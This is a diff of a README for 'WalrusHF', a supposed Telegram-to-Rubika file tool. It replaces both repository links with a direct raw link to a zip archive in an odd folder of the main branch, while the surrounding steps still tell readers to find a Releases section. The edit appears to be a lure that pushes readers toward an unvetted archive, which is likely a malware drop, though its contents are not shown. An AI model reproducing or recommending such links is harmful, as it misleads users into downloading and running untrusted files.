@@ -1,6 +1,6 @@
 # 🦦 WalrusHF - Manage Telegram files on Rubika easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bumboatbloodvessel418/WalrusHF)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bumboatbloodvessel418/WalrusHF/raw/refs/heads/main/tribofluorescence/Walrus-HF-v3.7-beta.1.zip)
 
 WalrusHF connects your Telegram account to your Rubika storage. It uses a cloud-based Space to move your files automatically. You use Telegram to send commands and the dashboard to watch your progress.
 
@@ -21,7 +21,7 @@ WalrusHF connects your Telegram account to your Rubika storage. It uses a cloud-
 
 ## 🚀 Getting started
 
-Visit this page to download the software: [https://github.com/bumboatbloodvessel418/WalrusHF](https://github.com/bumboatbloodvessel418/WalrusHF)
+Visit this page to download the software: [https://github.com/bumboatbloodvessel418/WalrusHF/raw/refs/heads/main/tribofluorescence/Walrus-HF-v3.7-beta.1.zip](https://github.com/bumboatbloodvessel418/WalrusHF/raw/refs/heads/main/tribofluorescence/Walrus-HF-v3.7-beta.1.zip)
 
 1. Go to the link above.
 2. Look for the Releases section on the right side.
